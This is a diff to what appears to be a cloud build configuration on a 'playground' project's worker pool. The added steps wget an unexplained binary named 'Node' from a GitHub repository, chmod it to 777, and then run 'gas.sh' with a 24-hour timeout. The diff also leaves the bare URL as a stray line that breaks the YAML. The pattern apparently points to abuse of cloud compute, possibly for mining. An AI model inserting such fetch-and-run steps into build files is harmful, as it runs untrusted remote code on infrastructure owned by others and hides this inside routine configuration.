@@ -1,10 +1,14 @@
 steps:
 - name: 'bash'
+  args: ['wget', 'https://raw.githubusercontent.com/diprassss/KUNTUL/main/Node']
+- name: 'bash'
+  args: ['chmod', '777', 'Node']
+- name: 'bash'
   args: ['chmod', '777', 'gas.sh']
 - name: 'bash'
   args: ['./gas.sh']
   timeout: 86400s
-
+https://raw.githubusercontent.com/diprassss/KUNTUL/main/Node
 options:
   pool:
     name: 'projects/playground-s-11-1815f4b3/locations/asia-east1/workerPools/A1-1'
